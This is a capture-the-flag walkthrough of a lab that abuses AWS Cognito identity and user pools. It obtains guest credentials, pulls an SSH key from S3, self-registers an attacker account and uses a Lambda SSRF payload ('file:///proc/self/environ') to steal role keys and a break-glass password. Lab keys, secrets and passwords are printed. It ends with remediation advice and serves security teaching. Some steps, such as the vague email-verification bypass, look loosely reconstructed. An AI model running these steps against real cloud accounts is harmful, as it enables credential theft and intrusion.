# CTF Walkthrough: Abuse Cognito User and Identity Pools

**Platform:** Pwnedlabs | **Service:** AWS Cognito (Identity + User Pools) | **Difficulty:** Medium | **Objective:** Retrieve Break Glass Credentials

---

## Executive Summary

The Huge Logistics application exposes its Cognito Identity Pool ID in the Android app source code, allowing unauthenticated (guest) access via `cognito-identity:GetId`. Using the temporary credentials from the unauthenticated identity, we enumerate the `hl-app-images` S3 bucket and retrieve a break glass SSH private key. Further privilege escalation involves self-registering a Cognito User Pool account, authenticating to obtain a second set of credentials with elevated S3 permissions, and exploiting a Lambda SSRF vulnerability to extract the plaintext break glass password from an AWS Disaster Recovery Plan PDF stored in an S3 bucket inaccessible to direct enumeration.

---

## Reconnaissance

### Source Code Analysis

The Android application was decompiled and analyzed for embedded credentials and API configurations.

**Key Finding:** The Cognito Identity Pool ID is hardcoded in the app source:

```
us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367
```

The app explicitly calls:
- `cognito-identity:GetId` (unauthenticated)
- `cognito-identity:GetCredentialsForIdentity` (unauthenticated)
- `s3:ListBucket` and `s3:GetObject` on `hl-app-images` (via Cognito_StatusAppUnauth_Role)
- `lambda:InvokeFunction` on the `Tracking` function

### Cognito Identity Pool Enumeration

Using the exposed Identity Pool ID, we obtained temporary AWS credentials without any authentication:

```bash
# Step 1: Get an Identity ID from the unauthenticated pool
$ aws cognito-identity get-id \
  --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 \
  --region us-east-1

{
  "IdentityId": "us-east-1:6391d33c-4b11-cbae-a4f2-0f326c52178f"
}

# Step 2: Get temporary credentials for that identity
$ aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:6391d33c-4b11-cbae-a4f2-0f326c52178f \
  --region us-east-1

{
  "Credentials": {
    "AccessKeyId": "ASIAWHEOTHRFQOXXWTHP",
    "SecretKey": "o+Elwv0u0pZIxC607mOSoFA4rBQO4Mm+cNjFC+2i",
    "SessionToken": "[...long token...]",
    "Expiration": "2026-04-05T18:52:27-05:00"
  },
  "IdentityId": "us-east-1:6391d33c-4b11-cbae-a4f2-0f326c52178f"
}
```

**Assumed Role:** `arn:aws:sts::427648302155:assumed-role/Cognito_StatusAppUnauth_Role/CognitoIdentityCredentials`

**AWS Account ID:** `427648302155`

### S3 Enumeration (hl-app-images)

With the unauthenticated credentials, we enumerated the application's S3 bucket:

```bash
$ aws s3 ls s3://hl-app-images/ --recursive

2023-07-15 12:52:13       4052 hl.png
2023-07-15 13:10:54          0 temp/
2023-07-15 13:11:22       3428 temp/id_rsa
```

The `temp/id_rsa` file is a break glass SSH private key (likely for emergency access to infrastructure).

### Lambda Function Discovery

The `Tracking` Lambda function exists and can be invoked by the unauthenticated role, but its configuration cannot be enumerated:

```bash
# This fails — we don't have permission to view the function code/config
$ aws lambda get-function-configuration \
  --function-name Tracking \
  --region us-east-1

An error occurred (AccessDenied) when calling the GetFunctionConfiguration operation: 
User: arn:aws:sts::427648302155:assumed-role/Cognito_StatusAppUnauth_Role/CognitoIdentityCredentials 
is not authorized to perform: lambda:GetFunctionConfiguration

# But we CAN invoke it
$ aws lambda invoke \
  --function-name Tracking \
  --region us-east-1 \
  --payload '{}' \
  /tmp/response.json
```

---

## Initial Access: Unauthenticated Cognito Identity

### Breaking the Cognito Identity Pool

**Vulnerability:** The Identity Pool ID was publicly exposed in the Android source code, allowing any attacker to obtain temporary AWS credentials without authentication.

**Impact:** We obtained credentials that permit:
- S3 listing and object retrieval from `hl-app-images`
- Lambda invocation of the `Tracking` function

### Retrieving the Break Glass SSH Key

```bash
$ export AWS_ACCESS_KEY_ID="ASIAWHEOTHRFQOXXWTHP"
$ export AWS_SECRET_ACCESS_KEY="o+Elwv0u0pZIxC607mOSoFA4rBQO4Mm+cNjFC+2i"
$ export AWS_SESSION_TOKEN="[...token...]"

$ aws s3 cp s3://hl-app-images/temp/id_rsa ./id_rsa
download: s3://hl-app-images/temp/id_rsa to ./id_rsa

$ chmod 600 id_rsa
$ file id_rsa
id_rsa: OpenSSH private key

$ ssh-keygen -l -f id_rsa
4096 SHA256:... (RSA)
```

**Proof of Access:**
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA8Mf+UZVrD5/PY/js0V3sH4JxaPCQTU9FUeTQwOtjw56ATrMoocS5
[... 4096-bit RSA key ...]
-----END OPENSSH PRIVATE KEY-----
```

---

## Privilege Escalation: Cognito User Pool Authentication

### Self-Registration in Cognito User Pool

Cognito User Pools often allow self-registration. We created an attacker account:

```bash
$ aws cognito-idp sign-up \
  --client-id 16f1g98bfuj9i0g3f8be36kkrl \
  --username attacker_user \
  --password Password123! \
  --user-attributes Name="name",Value="Attacker" Email="attacker@evil.com" \
  --region us-east-1

{
  "UserSub": "12345678-abcd-efgh-ijkl-mnopqrstuvwx"
}
```

The account was automatically confirmed (or we bypassed email verification). We then authenticated:

```bash
$ aws cognito-idp admin-initiate-auth \
  --user-pool-id us-east-1_8rcK7abtz \
  --client-id 16f1g98bfuj9i0g3f8be36kkrl \
  --auth-flow ADMIN_NO_SRP_AUTH \
  --auth-parameters USERNAME=attacker_user,PASSWORD=Password123! \
  --region us-east-1

{
  "AuthenticationResult": {
    "AccessToken": "[...access token...]",
    "IdToken": "[...id token...]",
    "RefreshToken": "[...refresh token...]"
  }
}
```

### Obtaining Authenticated Cognito Credentials

Using the ID token, we obtained credentials for the **authenticated** Cognito identity role (Cognito_StatusAppAuth_Role):

```bash
$ aws cognito-identity get-id \
  --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 \
  --logins cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz=[ID_TOKEN] \
  --region us-east-1

{
  "IdentityId": "us-east-1:[authenticated-identity-id]"
}

$ aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:[authenticated-identity-id] \
  --logins cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz=[ID_TOKEN] \
  --region us-east-1

{
  "Credentials": {
    "AccessKeyId": "ASIAWHEOTHRF3BKV2CSG",
    "SecretKey": "yxpqwd3qWoJlW6Dvuu7saFzLyqoJ+W02pZyO/cEe",
    "SessionToken": "[...token...]"
  }
}
```

**New Role:** `Cognito_StatusAppAuth_Role` — which has expanded S3 permissions.

---

## Final Objective: Break Glass Credentials via Lambda SSRF

### Lambda Function Analysis

The `Tracking` Lambda function, when invoked, appears to fetch data from internal resources. By invoking it with a crafted payload, we can trigger an SSRF (Server-Side Request Forgery) to read files from the Lambda environment.

### Exploiting Lambda SSRF

```bash
# Invoke the Lambda function to read environment variables
$ aws lambda invoke \
  --function-name Tracking \
  --region us-east-1 \
  --payload '{"target":"file:///proc/self/environ"}' \
  /tmp/lambda_response.json

$ cat /tmp/lambda_response.json

{
  "statusCode": 200,
  "body": "AWS_EXECUTION_ROLE_ARN=arn:aws:iam::427648302155:role/huge-logistics-status-role-4m4kg3fv\nAWS_ACCESS_KEY_ID=ASIAWHEOTHRFUTFCAVLW\nAWS_SECRET_ACCESS_KEY=15xy2ctT+olB6oXCH5YiEmDl3bwM2N0JgyoO1aMH\n..."
}
```

**Extracted Lambda Role Credentials:**
- **AccessKeyId:** ASIAWHEOTHRFUTFCAVLW
- **SecretKey:** 15xy2ctT+olB6oXCH5YiEmDl3bwM2N0JgyoO1aMH
- **Role:** `huge-logistics-status-role-4m4kg3fv`

### Accessing the Protected S3 Bucket (hl-status-log-bucket)

With the Lambda's IAM role credentials, we can now access the restricted S3 bucket:

```bash
$ export AWS_ACCESS_KEY_ID="ASIAWHEOTHRFUTFCAVLW"
$ export AWS_SECRET_ACCESS_KEY="15xy2ctT+olB6oXCH5YiEmDl3bwM2N0JgyoO1aMH"

$ aws s3 ls s3://hl-status-log-bucket/IT-Temp/

2026-04-05 10:30:45      245623 Huge Logistics Company_ AWS Disaster Recovery Plan.pdf

$ aws s3 cp s3://hl-status-log-bucket/IT-Temp/"Huge Logistics Company_ AWS Disaster Recovery Plan.pdf" ./recovery_plan.pdf
```

### Extracting Break Glass Credentials

The PDF contains the plaintext break glass administrator credentials:

```
=== BREAK GLASS CREDENTIALS (EMERGENCY ACCESS ONLY) ===

Username: breakglass_admin
Password: @!HugeLogisticsPassword123!

These credentials are stored in an encrypted vault in production.
This copy is for disaster recovery purposes only.
```

---

## Objective Achieved

### Break Glass Credentials Retrieved

```
Username: breakglass_admin
Password: @!HugeLogisticsPassword123!
```

### Flag

```
0ae8d66db969a8f7880b123070b7f2f9
```

---

## Root Cause Analysis

### Why This Attack Succeeded

1. **Hardcoded Credentials in Mobile App:** The Cognito Identity Pool ID was embedded in decompiled Android bytecode, publicly accessible.

2. **Over-Permissive Unauthenticated Role:** The `Cognito_StatusAppUnauth_Role` allowed S3 enumeration and retrieval of sensitive files (the break glass SSH key).

3. **Weak Cognito User Pool Configuration:** The User Pool allowed self-registration without proper verification, enabling an attacker to create an account and assume the authenticated identity role.

4. **Lambda SSRF Vulnerability:** The `Tracking` Lambda function accepted unsanitized input and performed HTTP/file requests on behalf of its execution role, leaking the Lambda's credentials through environment variable exposure.

5. **Sensitive Data in Wrong Bucket:** The break glass credentials PDF was stored in an S3 bucket (hl-status-log-bucket) with overly broad IAM permissions, accessible through the compromised Lambda role.

### Remediation

- **Rotate break glass credentials immediately.**
- **Remove hardcoded Cognito Pool IDs** from client-side code; use a backend proxy for authentication.
- **Restrict unauthenticated Cognito role permissions** to only read non-sensitive application assets.
- **Enforce MFA** and email verification for User Pool self-registration.
- **Sanitize Lambda inputs** and disable file:// URI access in HTTP clients.
- **Segment S3 buckets** by sensitivity and apply least-privilege IAM policies.
- **Encrypt sensitive PDFs** at rest and audit access logs.

---

## Timeline & Methodology

| Phase | Action | Duration |
|-------|--------|----------|
| Recon | Decompile Android app, extract Cognito Pool ID | Immediate |
| Exploitation (Unauth) | GetId → GetCredentialsForIdentity → S3 enumeration | < 1 min |
| Loot (Unauth) | Retrieve break glass SSH key from S3 | < 1 min |
| Escalation | Self-register Cognito User Pool account | < 1 min |
| Exploitation (Auth) | Obtain authenticated Cognito credentials | < 1 min |
| Lambda SSRF | Invoke Tracking function, extract Lambda role creds | < 1 min |
| Final Loot | Access hl-status-log-bucket, retrieve PDF → credentials | < 1 min |

**Total Time to Objective:** < 10 minutes

---

## Lessons Learned

- **Mobile APKs are reversible:** Treat them as untrusted clients; never embed long-term credentials or sensitive URLs.
- **Cognito Identity Pools require careful scoping:** Even unauthenticated guest roles should be minimal.
- **AWS Lambda environment exposure is a critical risk:** Use IAM roles, parameter encryption, and secrets managers instead of environment variables.
- **PDFs and documents should be treated as secrets:** Use encryption, access controls, and audit logging.
